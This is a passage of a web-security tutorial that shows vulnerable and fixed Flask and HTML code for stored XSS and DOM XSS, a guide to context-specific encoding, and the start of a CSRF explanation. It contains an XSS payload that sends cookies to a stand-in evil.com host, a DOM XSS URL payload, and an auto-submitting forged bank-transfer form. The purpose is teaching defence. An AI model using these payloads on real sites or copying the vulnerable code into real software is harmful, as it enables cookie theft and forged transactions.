<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">html</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">bleach</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">comments_db</span> <span class="o">=</span> <span class="p">[]</span>  <span class="c1"># Simulated database</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># VULNERABLE: Stored XSS via comments</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/comments&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_comment_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Store comment without sanitization.&quot;&quot;&quot;</span>
    <span class="n">comment</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;author&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;author&#39;</span><span class="p">],</span>
        <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">],</span>  <span class="c1"># Stored as-is!</span>
    <span class="p">}</span>
    <span class="n">comments_db</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">comment</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;added&quot;</span><span class="p">})</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/comments-vulnerable&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">show_comments_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Render comments without escaping.&quot;&quot;&quot;</span>
    <span class="n">html_parts</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Comments&lt;/h1&gt;&#39;</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">comments_db</span><span class="p">:</span>
        <span class="c1"># VULNERABLE: Direct insertion of stored data</span>
        <span class="n">html_parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&lt;div&gt;&lt;b&gt;</span><span class="si">{</span><span class="n">c</span><span class="p">[</span><span class="s2">&quot;author&quot;</span><span class="p">]</span><span class="si">}</span><span class="s1">&lt;/b&gt;: </span><span class="si">{</span><span class="n">c</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span><span class="si">}</span><span class="s1">&lt;/div&gt;&#39;</span><span class="p">)</span>
    <span class="n">html_parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">html_parts</span><span class="p">)</span>

<span class="c1"># Attack: POST {&quot;author&quot;: &quot;hacker&quot;, &quot;text&quot;: &quot;&lt;script&gt;new Image().src=&#39;https://evil.com/steal?c=&#39;+document.cookie&lt;/script&gt;&quot;}</span>
<span class="c1"># Every user who views comments page has their cookies stolen</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># FIXED: Sanitize on output (and optionally on input)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/comments-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_comment_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Store comment with input validation.&quot;&quot;&quot;</span>
    <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;author&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

    <span class="c1"># Input validation</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">author</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Author and text required&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">author</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">5000</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Input too long&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># Option A: Strip all HTML (for plain text comments)</span>
    <span class="n">comment</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;author&#39;</span><span class="p">:</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">author</span><span class="p">),</span>
        <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">text</span><span class="p">),</span>
    <span class="p">}</span>

    <span class="c1"># Option B: Allow limited HTML (for rich text comments)</span>
    <span class="c1"># Uses bleach to whitelist specific tags</span>
    <span class="n">comment_rich</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;author&#39;</span><span class="p">:</span> <span class="n">bleach</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="n">tags</span><span class="o">=</span><span class="p">[],</span> <span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span>
        <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">bleach</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span>
            <span class="n">text</span><span class="p">,</span>
            <span class="n">tags</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;em&#39;</span><span class="p">,</span> <span class="s1">&#39;strong&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;code&#39;</span><span class="p">,</span> <span class="s1">&#39;pre&#39;</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;br&#39;</span><span class="p">],</span>
            <span class="n">attributes</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">,</span> <span class="s1">&#39;title&#39;</span><span class="p">]},</span>
            <span class="n">protocols</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">],</span>  <span class="c1"># No javascript: URLs!</span>
            <span class="n">strip</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">),</span>
    <span class="p">}</span>

    <span class="n">comments_db</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">comment</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;added&quot;</span><span class="p">})</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/comments-secure&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">show_comments_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Render comments with Jinja2 auto-escaping.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Comments&lt;/h1&gt;</span>
<span class="s2">        {</span><span class="si">% f</span><span class="s2">or c in comments %}</span>
<span class="s2">        &lt;div&gt;</span>
<span class="s2">            &lt;b&gt;{{ c.author }}&lt;/b&gt;: {{ c.text }}</span>
<span class="s2">        &lt;/div&gt;</span>
<span class="s2">        {</span><span class="si">% e</span><span class="s2">ndfor %}</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span><span class="p">,</span> <span class="n">comments</span><span class="o">=</span><span class="n">comments_db</span><span class="p">)</span>
</code></pre></div>

<h3 id="34-dom-based-xss">3.4 DOM-Based XSS<a class="header-link" href="#34-dom-based-xss" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- dom_xss_vulnerable.html --&gt;</span>
<span class="cm">&lt;!-- VULNERABLE: DOM-based XSS --&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;greeting&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">    </span><span class="c1">// VULNERABLE: Reads from URL fragment and inserts into DOM unsafely</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">1</span><span class="p">));</span>
<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;greeting&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Hello, &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="w">    </span><span class="c1">// innerHTML interprets HTML, so script tags will execute</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>

<span class="cm">&lt;!--</span>
<span class="cm">Attack URL: page.html#&lt;img src=x onerror=alert(document.cookie)&gt;</span>
<span class="cm">The payload never reaches the server (fragment is client-side only)</span>
<span class="cm">--&gt;</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- dom_xss_fixed.html --&gt;</span>
<span class="cm">&lt;!-- FIXED: Safe DOM manipulation --&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;greeting&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">    </span><span class="c1">// FIXED: Use textContent instead of innerHTML</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">1</span><span class="p">));</span>

<span class="w">    </span><span class="c1">// Method 1: textContent (sets plain text, no HTML parsing)</span>
<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;greeting&#39;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Hello, &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// Method 2: Create text node</span>
<span class="w">    </span><span class="c1">// var textNode = document.createTextNode(&#39;Hello, &#39; + name);</span>
<span class="w">    </span><span class="c1">// document.getElementById(&#39;greeting&#39;).appendChild(textNode);</span>

<span class="w">    </span><span class="c1">// Method 3: Use a sanitization library (DOMPurify)</span>
<span class="w">    </span><span class="c1">// import DOMPurify from &#39;dompurify&#39;;</span>
<span class="w">    </span><span class="c1">// document.getElementById(&#39;greeting&#39;).innerHTML =</span>
<span class="w">    </span><span class="c1">//     DOMPurify.sanitize(&#39;Hello, &#39; + name);</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>

<h3 id="35-xss-context-specific-encoding">3.5 XSS Context-Specific Encoding<a class="header-link" href="#35-xss-context-specific-encoding" title="Permanent link">&para;</a></h3>
<p>Different HTML contexts require different encoding strategies:</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚<span class="w">              </span>XSS<span class="w"> </span>Encoding<span class="w"> </span>by<span class="w"> </span>Context<span class="w">                             </span>â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>Context<span class="w">              </span>Encoding<span class="w"> </span>Required<span class="w">        </span>Example<span class="w">           </span>â”‚
â”‚<span class="w">  </span>â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="w">            </span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="w">        </span>â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="w">         </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>HTML<span class="w"> </span>body<span class="w">            </span>HTML<span class="w"> </span>entity<span class="w"> </span>encoding<span class="w">                       </span>â”‚
â”‚<span class="w">  </span><span class="nt">&lt;p&gt;</span>USER_INPUT<span class="nt">&lt;/p&gt;</span><span class="w">    </span><span class="ni">&amp;lt;</span><span class="w"> </span><span class="ni">&amp;gt;</span><span class="w"> </span><span class="ni">&amp;amp;</span><span class="w"> </span><span class="ni">&amp;quot;</span><span class="w">                    </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>HTML<span class="w"> </span>attribute<span class="w">       </span>HTML<span class="w"> </span>attribute<span class="w"> </span>encoding<span class="w"> </span>+<span class="w"> </span>quote<span class="w">            </span>â”‚
â”‚<span class="w">  </span><span class="nt">&lt;div</span><span class="w"> </span><span class="na">title=</span><span class="s">&quot;INPUT&quot;</span><span class="nt">&gt;</span><span class="w">  </span>Use<span class="w"> </span>quotes,<span class="w"> </span>encode<span class="w"> </span>&quot;<span class="w"> </span><span class="err">&amp;</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span>&gt;<span class="w">               </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>JavaScript<span class="w"> </span>string<span class="w">    </span>JavaScript<span class="w"> </span>encoding<span class="w">                       </span>â”‚
â”‚<span class="w">  </span>var<span class="w"> </span>x<span class="w"> </span>=<span class="w"> </span>&#39;INPUT&#39;;<span class="w">     </span>\xHH<span class="w"> </span>or<span class="w"> </span>\uHHHH<span class="w"> </span>encoding<span class="w">                  </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>URL<span class="w"> </span>parameter<span class="w">        </span>URL/percent<span class="w"> </span>encoding<span class="w">                       </span>â”‚
â”‚<span class="w">  </span>href=&quot;?q=INPUT&quot;<span class="w">      </span>%XX<span class="w"> </span>encoding<span class="w">                              </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>CSS<span class="w"> </span>value<span class="w">            </span>CSS<span class="w"> </span>encoding<span class="w">                               </span>â”‚
â”‚<span class="w">  </span>style=&quot;color:INPUT&quot;<span class="w">  </span>\HH<span class="w"> </span>encoding<span class="w"> </span>(avoid<span class="w"> </span>if<span class="w"> </span>possible)<span class="w">          </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>IMPORTANT:<span class="w"> </span>Use<span class="w"> </span>the<span class="w"> </span>encoding<span class="w"> </span>for<span class="w"> </span>the<span class="w"> </span>SPECIFIC<span class="w"> </span>context<span class="w">            </span>â”‚
â”‚<span class="w">  </span>HTML<span class="w"> </span>encoding<span class="w"> </span>in<span class="w"> </span>a<span class="w"> </span>JavaScript<span class="w"> </span>string<span class="w"> </span>context<span class="w"> </span>is<span class="w"> </span>NOT<span class="w"> </span>sufficient!<span class="w"> </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">xss_encoding.py - Context-specific XSS encoding</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">html</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">markupsafe</span><span class="w"> </span><span class="kn">import</span> <span class="n">Markup</span><span class="p">,</span> <span class="n">escape</span>


<span class="k">def</span><span class="w"> </span><span class="nf">encode_for_html</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Encode for HTML body context.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
    <span class="c1"># &lt; â†’ &amp;lt;  &gt; â†’ &amp;gt;  &amp; â†’ &amp;amp;  &quot; â†’ &amp;quot;  &#39; â†’ &amp;#x27;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">encode_for_html_attribute</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Encode for HTML attribute context.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">quote</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">encode_for_javascript</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Encode for JavaScript string context.&quot;&quot;&quot;</span>
    <span class="c1"># json.dumps adds quotes and escapes special chars</span>
    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
    <span class="c1"># This handles: \n, \r, \t, \&quot;, \\, unicode chars</span>


<span class="k">def</span><span class="w"> </span><span class="nf">encode_for_url</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Encode for URL parameter context.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>


<span class="c1"># Usage in Flask/Jinja2 template:</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="sd">&lt;!-- HTML context (Jinja2 auto-escapes) --&gt;</span>
<span class="sd">&lt;p&gt;{{ user_input }}&lt;/p&gt;</span>

<span class="sd">&lt;!-- HTML attribute (Jinja2 auto-escapes) --&gt;</span>
<span class="sd">&lt;div title=&quot;{{ user_input }}&quot;&gt;</span>

<span class="sd">&lt;!-- JavaScript context (use tojson filter) --&gt;</span>
<span class="sd">&lt;script&gt;</span>
<span class="sd">var data = {{ user_input|tojson }};</span>
<span class="sd">&lt;/script&gt;</span>

<span class="sd">&lt;!-- URL context --&gt;</span>
<span class="sd">&lt;a href=&quot;/search?q={{ user_input|urlencode }}&quot;&gt;Search&lt;/a&gt;</span>

<span class="sd">&lt;!-- DANGEROUS: Never put user input directly in these contexts --&gt;</span>
<span class="sd">&lt;!-- &lt;script&gt;{{ user_input }}&lt;/script&gt;            NEVER --&gt;</span>
<span class="sd">&lt;!-- &lt;div onmouseover=&quot;{{ user_input }}&quot;&gt;         NEVER --&gt;</span>
<span class="sd">&lt;!-- &lt;style&gt;{{ user_input }}&lt;/style&gt;               NEVER --&gt;</span>
<span class="sd">&quot;&quot;&quot;</span>
</code></pre></div>

<hr />
<h2 id="4-cross-site-request-forgery-csrf">4. Cross-Site Request Forgery (CSRF)<a class="header-link" href="#4-cross-site-request-forgery-csrf" title="Permanent link">&para;</a></h2>
<h3 id="41-how-csrf-works">4.1 How CSRF Works<a class="header-link" href="#41-how-csrf-works" title="Permanent link">&para;</a></h3>
<p>CSRF tricks a logged-in user's browser into sending a forged request to a vulnerable application, using the user's existing session cookie.</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚<span class="w">              </span>Cross-Site<span class="w"> </span>Request<span class="w"> </span>Forgery<span class="w"> </span>(CSRF)<span class="w">                   </span>â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>1.<span class="w"> </span>User<span class="w"> </span>logs<span class="w"> </span>into<span class="w"> </span>bank.com<span class="w"> </span>(session<span class="w"> </span>cookie<span class="w"> </span>set)<span class="w">                </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>2.<span class="w"> </span>User<span class="w"> </span>visits<span class="w"> </span>evil.com<span class="w"> </span>(in<span class="w"> </span>another<span class="w"> </span>tab)<span class="w">                       </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>3.<span class="w"> </span>evil.com<span class="w"> </span>contains:<span class="w">                                           </span>â”‚
â”‚<span class="w">     </span><span class="nt">&lt;form</span><span class="w"> </span><span class="na">action=</span><span class="s">&quot;https://bank.com/transfer&quot;</span><span class="w"> </span><span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span><span class="w">    </span>â”‚
â”‚<span class="w">       </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;to&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;attacker&quot;</span><span class="nt">&gt;</span><span class="w">         </span>â”‚
â”‚<span class="w">       </span><span class="nt">&lt;input</span><span class="w"> </span><span class="na">type=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;amount&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;10000&quot;</span><span class="nt">&gt;</span><span class="w">        </span>â”‚
â”‚<span class="w">     </span><span class="nt">&lt;/form&gt;</span><span class="w">                                                      </span>â”‚
â”‚<span class="w">     </span><span class="nt">&lt;script&gt;</span>document.forms[0].submit()<span class="nt">&lt;/script&gt;</span><span class="w">                 </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>4.<span class="w"> </span>Browser<span class="w"> </span>sends<span class="w"> </span>the<span class="w"> </span>form<span class="w"> </span>POST<span class="w"> </span>to<span class="w"> </span>bank.com<span class="w">                     </span>â”‚
â”‚<span class="w">     </span>WITH<span class="w"> </span>the<span class="w"> </span>user&#39;s<span class="w"> </span>session<span class="w"> </span>cookie<span class="w"> </span>(automatic)<span class="w">                  </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>5.<span class="w"> </span>bank.com<span class="w"> </span>receives<span class="w"> </span>a<span class="w"> </span>valid,<span class="w"> </span>authenticated<span class="w"> </span>request<span class="w">            </span>â”‚
â”‚<span class="w">     </span>and<span class="w"> </span>transfers<span class="w"> </span>$10,000<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>attacker<span class="w">                       </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>â”Œâ”€â”€â”€â”€â”€â”€â”<span class="w">    </span>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<span class="w">    </span>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<span class="w">                      </span>â”‚
â”‚<span class="w">  </span>â”‚Victimâ”‚â”€â”€â”€â–¶â”‚<span class="w"> </span>evil.com<span class="w"> </span>â”‚â”€â”€â”€â–¶â”‚<span class="w"> </span>bank.com<span class="w"> </span>â”‚<span class="w">                      </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w">      </span>â”‚<span class="w">    </span>â”‚<span class="w"> </span>(hidden<span class="w">  </span>â”‚<span class="w">    </span>â”‚<span class="w"> </span>(trusts<span class="w">  </span>â”‚<span class="w">                      </span>â”‚
â”‚<span class="w">  </span>â”‚<span class="w">      </span>â”‚<span class="w">    </span>â”‚<span class="w">  </span>form)<span class="w">   </span>â”‚<span class="w">    </span>â”‚<span class="w">  </span>cookie)<span class="w"> </span>â”‚<span class="w">                      </span>â”‚
